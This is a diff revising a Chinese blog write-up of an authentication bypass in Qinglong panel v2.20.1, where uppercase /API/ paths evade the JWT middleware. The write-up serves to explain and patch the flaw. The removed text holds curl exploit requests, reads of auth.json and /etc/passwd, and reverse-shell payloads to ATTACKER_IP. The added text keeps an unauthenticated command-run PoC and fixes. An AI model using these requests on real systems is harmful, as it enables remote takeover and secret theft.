@@ -1,365 +1,116 @@
 ---
-title: "青龙面板鉴权绕过漏洞复现 - 从路径大小写到 RCE"
+title: "青龙面板 v2.20.1 鉴权绕过复盘：一个大写 /API/ 绕穿全局中间件"
 date: 2026-02-28T16:45:00+08:00
 draft: false
-weight: 1
-categories: ["OpenClaw"]
-tags: ["OpenClaw", "部署", "教程"]
-image: "/tech-cover-1.jpg"
-description: "青龙面板鉴权绕过漏洞复现 - 从路径大小写到 RCE - 详细部署教程"
----
+categories: ["漏洞分析"]
+tags: ["青龙面板", "鉴权绕过", "Node.js", "Express", "漏洞复现"]
+description: "复盘青龙面板 v2.20.1 的一处经典鉴权绕过（Issue #2934）：前置中间件用区分大小写的 startsWith('/api/') 做拦截，底下的 Express 路由却默认忽略大小写，改成 /API/ 直接跳过 JWT 校验打进后台接口。"
+weight: 10
 ---
 
-> **时效性提醒（2026-07 更新）**：本文发布于 2026 年 2 月，距今已近 5 个月。青龙面板该鉴权绕过漏洞在新版本中大概率已修复，当前可用性存疑。本文仅供漏洞复现学习参考，文中 Docker 部署的是历史漏洞版本。
+> 时效提醒：这是 2026 年 2 月底披露的历史漏洞（见 [GitHub Issue #2934](https://github.com/whyour/qinglong/issues/2934)），官方在后续版本镜像中早已修复。文中拉取旧版 `2.20.1` 容器仅作本地回环环境下的代码审计复盘。
 
----
+青龙面板（`whyour/qinglong`）在 `2.20.1` 版本（更早的 `2.20.0` / `2.19.x` 分支若沿用同款中间件写法同样存在隐患）出过一个让人哭笑不得的未授权命令执行漏洞。整个绕过过程连复杂的编码变形都用不上，纯粹就是把请求路径里的 `/api/` 改成大写的 `/API/`，前门的 JWT 鉴权中间件当场失明，直接放请求进后台接口跑系统命令。
 
-# 使用 Docker 部署漏洞版本
-docker run -d \
-  -p 5700:5700 \
-  -v $(pwd)/data:/ql/data \
-  --name qinglong \
-  whyour/qinglong:2.20.1
+## 0x00 中间件认大小写，底下的路由却不认
 
-# 访问面板
-# http://localhost:5700
-```
-
-### 2. 验证环境
-
-```bash
-# 检查版本
-curl http://localhost:5700/api/system/version
-
-# 预期输出
-{"data":"2.20.1","code":200}
-```
-
----
-
-## 漏洞复现
-
-### 步骤 1: 验证鉴权绕过
-
-正常情况（需要认证）：
-
-```bash
-# 直接访问 /api/ 路径会被拦截
-curl -X PUT "http://localhost:5700/api/system/command-run" \
-  -H "Content-Type: application/json" \
-  -d '{"command": "id"}'
-
-# 响应：401 Unauthorized
-{"code":401,"message":"未授权访问"}
-```
-
-利用大小写绕过：
-
-```bash
-# 使用 /API/ (大写) 绕过鉴权
-curl -X PUT "http://localhost:5700/API/system/command-run" \
-  -H "Content-Type: application/json" \
-  -d '{"command": "id"}'
-
-# 响应：200 OK
-{
-  "code": 200,
-  "data": "uid=0(root) gid=0(root) groups=0(root)"
-}
-```
-
-### 步骤 2: 执行系统命令
-
-获取系统信息：
-
-```bash
-# 查看当前用户
-curl -X PUT "http://localhost:5700/API/system/command-run" \
-  -H "Content-Type: application/json" \
-  -d '{"command": "whoami"}'
-
-# 查看主机名
-curl -X PUT "http://localhost:5700/API/system/command-run" \
-  -H "Content-Type: application/json" \
-  -d '{"command": "hostname"}'
-
-# 查看环境变量
-curl -X PUT "http://localhost:5700/API/system/command-run" \
-  -H "Content-Type: application/json" \
-  -d '{"command": "env"}'
-```
-
-读取敏感文件：
-
-```bash
-# 读取青龙配置文件
-curl -X PUT "http://localhost:5700/API/system/command-run" \
-  -H "Content-Type: application/json" \
-  -d '{"command": "cat /ql/data/config/auth.json"}'
-
-# 读取系统密码本 (需要 root 权限)
-curl -X PUT "http://localhost:5700/API/system/command-run" \
-  -H "Content-Type: application/json" \
-  -d '{"command": "cat /etc/passwd"}'
-```
-
-### 步骤 3: 获取 Shell
-
-反弹 Shell：
-
-```bash
-# Bash 反弹
-curl -X PUT "http://localhost:5700/API/system/command-run" \
-  -H "Content-Type: application/json" \
-  -d '{"command": "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"}'
-
-# Python 反弹
-curl -X PUT "http://localhost:5700/API/system/command-run" \
-  -H "Content-Type: application/json" \
-  -d '{"command": "python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"\"ATTACKER_IP\"\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"\"/bin/sh\"\",\"\"-i\"\"]);\""}'
-
-# NC 反弹
-curl -X PUT "http://localhost:5700/API/system/command-run" \
-  -H "Content-Type: application/json" \
-  -d '{"command": "nc -e /bin/sh ATTACKER_IP 4444"}'
-```
-
----
-
-## 技术细节分析
-
-### 1. Express 路由大小写不敏感
-
-Express 框架默认对路由大小写不敏感：
-
-```javascript
-const express = require('express');
-const app = express();
-
-app.get('/api/test', (req, res) => {
-    res.send('Hello');
-});
-
-// 以下请求都能匹配到上述路由
-// GET /api/test      ✓
-// GET /API/test      ✓
-// GET /Api/test      ✓
-// GET /aPi/TeSt      ✓
-```
-
-这是 Express 的默认行为，可以通过 `app.set('case sensitive routing', true)` 启用大小写敏感。
-
-### 2. 鉴权中间件逻辑漏洞
-
-问题代码：
+翻一下当时 `back/loaders/express.ts` 里的全局鉴权中间件成因示意，一眼就能看出毛病出在哪：
 
 ```typescript
-// back/loaders/express.ts
 app.use((req, res, next) => {
-    // 白名单路径，不需要鉴权
+    // 初衷：只要不是访问 /open/ 或 /api/，就当成前端静态页面直接放行
     if (!['/open/', '/api/'].some((x) => req.path.startsWith(x))) {
-        return next();  // 跳过 JWT 校验
+        return next();
     }
-    
-    // 验证 JWT 令牌
+
     const token = req.headers.authorization;
     if (!verifyToken(token)) {
-        return res.status(401).json({ code: 401, message: '未授权' });
+        return res.status(401).json({ code: 401, message: '未授权访问' });
     }
-    
     next();
 });
 ```
 
-绕过原理：
+JavaScript 字符串原生的 `startsWith()` 是严格区分大小写的，而 Express 框架底层的路由匹配偏偏默认不区分大小写（`case sensitive routing` 选项默认关闭，`/api/test`、`/API/test`、`/aPi/TeSt` 全都能命中同一条 `app.get('/api/test', ...)`）。
 
+这就造出了一个极经典的解析差：当你把请求发往 `/API/system/command-run` 时，前置中间件拿 `'/API/...'` 去跟小写的 `'/api/'` 比前缀，得到 `false`，误以为你请求的是普通前端静态文件，直接 `return next()` 放过了 Token 校验；等请求一路往下走到 Express 路由表，路由层压根不挑大小写，痛痛快快把内置的系统命令执行处理器给调了起来。
+
+更麻烦的是，这把钥匙捅开的不止一个接口，面板底下整排高危管理接口全跟着一块儿敞开了：
+
+| 接口路径 | 原本用途 | 未授权打通后的后果 |
+|---|---|---|
+| `/api/system/command-run` | 执行系统命令 | 直接以容器运行身份执行任意命令 |
+| `/api/envs` | 环境变量管理 | 读走面板里存的全部第三方 Cookie、机器人 Token 与密钥 |
+| `/api/crons` / `/api/scripts` | 定时任务与脚本文件管理 | 直接篡改本地脚本内容或立即拉起任意任务 |
+| `/api/subscriptions` | 拉取远程脚本仓库与订阅 | 往定时任务里塞恶意远程脚本仓库实现持久化 |
+| `/api/user` | 面板账户管理 | 篡改管理员凭据或接管面板登录 |
+
+## 0x01 本地起个 `2.20.1` 容器验证一眼
+
+在本地绑死 `127.0.0.1` 回环地址起一个旧版 `2.20.1` 容器就能复现（切记千万别绑公网网卡）：
+
+```bash
+docker run -d \
+  -p 127.0.0.1:5700:5700 \
+  --name qinglong-vuln-lab \
+  whyour/qinglong:2.20.1
 ```
-请求路径：/API/system/command-run
 
-1. req.path = '/API/system/command-run'
-2. req.path.startsWith('/api/') = false  ← 大小写不匹配
-3. 条件为真，执行 next()  ← 跳过 JWT 校验
-4. Express 路由匹配：/API/ → /api/  ← 大小写不敏感，成功匹配
-5. 执行命令执行接口 ← 未授权访问成功
+等容器初始化跑完，先查一眼版本号，确认靶机是 `2.20.1`：
+
+```bash
+curl -s "http://127.0.0.1:5700/api/system/version"
+# {"data":"2.20.1","code":200}
 ```
 
-### 3. 可利用 API 接口
+接着不带登录态按正常小写路径发一条 `PUT` 请求，会被鉴权中间件规规矩矩拦在门外：
 
-青龙面板提供多个危险 API 接口：
+```bash
+curl -s -X PUT "http://127.0.0.1:5700/api/system/command-run" \
+  -H "Content-Type: application/json" \
+  -d '{"command": "id"}'
+# {"code":401,"message":"未授权访问"}
+```
 
-| 接口路径 | 功能 | 危险等级 |
-|---------|------|---------|
-| `/api/system/command-run` | 执行系统命令 | 严重 |
-| `/api/env` | 管理环境变量 | 高 |
-| `/api/repo` | 管理仓库 | 高 |
-| `/api/subscription` | 管理订阅 | 中 |
-| `/api/user` | 用户管理 | 高 |
+其他地方一个字不用动，单把路径里的 `/api/` 改成大写的 `/API/` 再发一次：
 
----
+```bash
+curl -s -X PUT "http://127.0.0.1:5700/API/system/command-run" \
+  -H "Content-Type: application/json" \
+  -d '{"command": "id"}'
+# {"code":200,"data":"uid=0(root) gid=0(root) groups=0(root)"}
+```
 
-## 防御建议
+因为青龙容器内部默认就是 `root` 身份在跑，而且面板目录底下躺着存有登录摘要和令牌的 `/ql/data/config/auth.json` 以及满肚子的业务环境变量，当时凡是把 `5700` 端口裸露在公网上的旧版实例，一旦被扫到基本就是整机失守。验证完记得顺手 `docker rm -f qinglong-vuln-lab` 把靶机清掉。
 
-### 1. 官方修复方案
+## 0x02 代码层怎么修才不留死角
 
-修复鉴权逻辑：
+在 Express 里写全局鉴权中间件，要彻底堵死这类大小写与路径变形错位，最好两头一起收紧。
+
+第一头是把鉴权中间件改成忽略大小写的正则匹配，或者干脆反转成"默认全部要求登录，只放行明确列出的登录接口与静态资源后缀"的白名单模式：
 
 ```typescript
-// 修复后：使用正则忽略大小写
 const authPaths = [/^\/open\//i, /^\/api\//i];
 
 app.use((req, res, next) => {
     if (!authPaths.some((pattern) => pattern.test(req.path))) {
         return next();
     }
-    
-    // 验证 JWT 令牌
+
     const token = req.headers.authorization;
     if (!verifyToken(token)) {
-        return res.status(401).json({ code: 401, message: '未授权' });
+        return res.status(401).json({ code: 401, message: '未授权访问' });
     }
-    
     next();
 });
 ```
 
-启用大小写敏感路由：
+第二头是顺手把 Express 的大小写敏感路由开关显式打开：
 
 ```typescript
-const app = express();
-app.set('case sensitive routing', true);  // 启用大小写敏感
-
-// 现在 /API/ 和 /api/ 是两个不同的路由
+app.set('case sensitive routing', true);
 ```
 
-### 2. 临时缓解措施
+这样前置中间件和底层路由表对路径的判断口径彻底一致，不会再出现"前门当静态资源放行、后门当 API 接单"的乌龙。
 
-方案 1: 反向代理过滤
-
-```nginx
-# Nginx 配置
-location / {
-    # 强制转换为小写
-    set $lower_uri $uri;
-    if ($uri ~* ^/(API)/) {
-        return 403;  # 拦截大写 API 路径
-    }
-    
-    proxy_pass http://localhost:5700;
-}
-```
-
-方案 2: WAF 规则
-
-```yaml
-# ModSecurity 规则
-SecRule REQUEST_URI "@rx (?i)/API/" \
-    "id:1001,\
-    phase:1,\
-    deny,\
-    status:403,\
-    msg:'QL Panel Auth Bypass Attempt'"
-```
-
-### 3. 用户侧防护
-
-```bash
-# 1. 限制访问来源
-iptables -A INPUT -p tcp --dport 5700 -s 127.0.0.1 -j ACCEPT
-iptables -A INPUT -p tcp --dport 5700 -j DROP
-
-# 2. 使用强认证
-# 修改默认密码
-# 启用双因素认证 (如果支持)
-
-# 3. 定期更新
-docker pull whyour/qinglong:latest
-docker restart qinglong
-
-# 4. 监控日志
-tail -f /ql/log/system.log | grep -E "(API|command|auth)"
-```
-
----
-
-## 影响评估
-
-### 受影响版本
-
-| 版本 | 状态 |
-|------|------|
-| 2.20.1 | 受影响 |
-| 2.20.0 | 可能受影响 |
-| 2.19.x | 待确认 |
-| < 2.19 | 待确认 |
-
-### 潜在危害
-
-1. 服务器完全沦陷 - 攻击者可执行任意命令
-2. 数据泄露 - 读取配置文件、数据库、密钥
-3. 内网渗透 - 以服务器为跳板攻击内网
-4. 挖矿/僵尸网络 - 植入恶意程序
-
-### 攻击场景
-
-```
-互联网扫描 → 发现 5700 端口 → 利用鉴权绕过 → 执行命令
-    → 读取配置 → 获取数据库密码 → 数据泄露
-    → 植入后门 → 持久化控制 → 内网横向移动
-```
-
----
-
-## 相关漏洞案例
-
-### 1. JWT 鉴权绕过常见手法
-
-| 手法 | 描述 | 案例 |
-|------|------|------|
-| 大小写绕过 | `/API/` vs `/api/` | 本文漏洞 |
-| 路径遍历 | `/..//api/` | CVE-2023-XXXX |
-| 编码绕过 | URL 编码、Unicode | CVE-2022-XXXX |
-| 算法混淆 | `alg: none` | JWT 经典漏洞 |
-
-### 2. Node.js/Express 类似漏洞
-
-- CVE-2024-29180: express-fileupload 路径遍历
-- CVE-2022-24999: Express 原型污染
-- CVE-2024-45590: app-html 包 RCE
-
----
-
-## 时间线
-
-| 日期 | 事件 |
-|------|------|
-| 2026-02-27 | 漏洞首次披露 (GitHub Issue #2934) |
-| 2026-02-28 | 漏洞细节公开 |
-| 2026-02-28 | 本文发布 |
-| TBD | CVE 编号分配 |
-| TBD | 官方修复版本发布 |
-
----
-
-## 参考资料
-
-1. [GitHub Issue #2934](https://github.com/whyour/qinglong/issues/2934)
-2. [Express 官方文档 - 路由](https://expressjs.com/en/guide/routing.html)
-3. [OWASP - 鉴权绕过](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/)
-4. [Node.js 安全最佳实践](https://nodejs.org/en/docs/guides/security/)
-
----
-
-## Tags
-
-#鉴权绕过 #RCE #青龙面板 #Node.js 安全 #Express #漏洞复现 #渗透测试
-
----
-
-*本文基于公开披露的漏洞信息编写，旨在提高安全意识。请合法使用安全技术。*
-
-
-
-<!-- JSON-LD: {"@context": "https://schema.org", "@type": "BlogPosting", "headline": "青龙面板鉴权绕过漏洞复现 - 从路径大小写到 RCE", "description": "青龙面板鉴权绕过漏洞复现 - 从路径大小写到 RCE - > ⚠️ **免责声明**：本文仅用于安全研究与教育目的，请勿将技术用于非法用途。  ## 📋 漏洞摘要  | 项目 | 详情 | |------|------| | **漏洞名称** | 青龙面板鉴权绕过导致 RCE | | **影响版本** | Qin...", "inLanguage": "zh-CN", "datePublished": "2026-03-11T05:14:56.352239", "author": {"@type": "Person", "name": "言零"}} -->
-
-
-<!-- JSON-LD: {"@context": "https://schema.org", "@type": "BlogPosting", "headline": "青龙面板鉴权绕过漏洞复现 - 从路径大小写到 RCE", "description": "青龙面板鉴权绕过漏洞复现 - 从路径大小写到 RCE - ## 🎯 漏洞概述  青龙面板 (Qinglong Panel) 是一款流行的定时任务管理面板，广泛应用于脚本管理、自动化任务等场景。  2026 年 2 月，安全研究人员发现青龙面板最新版本存在一处**鉴权绕过漏洞**。攻击者通过构造特殊的路径大小写，可...", "inLanguage": "zh-CN", "datePublished": "2026-03-11T05:15:37.230755", "author": {"@type": "Person", "name": "言零"}} -->
+对平时自用青龙面板的玩家来说，第一件事肯定是直接 `docker pull whyour/qinglong:latest` 升到新版镜像，再去翻一眼 `/ql/log/system.log` 里有没有陌生 IP 留下的大写 `API` 请求痕迹。要是实在有老环境暂时动不了、想靠前面的 Nginx 先挡一刀，写规则时千万别手滑写成不区分大小写的 `if ($uri ~* ^/api/) { return 403; }`，那样会把正常的后台接口一块儿拍死；得用区分大小写的正则（比如 `if ($request_uri ~ "^/(?![a-z]+/)(?i:api|open)/")` 或干脆只放行全小写的 `/api/`）。当然最省心的规矩还是老生常谈：这种能直接跑定时脚本的面板别往公网敞，绑死 `127.0.0.1` 走 WireGuard 或 SSH 隧道连上去管，比啥 WAF 规则都管用。
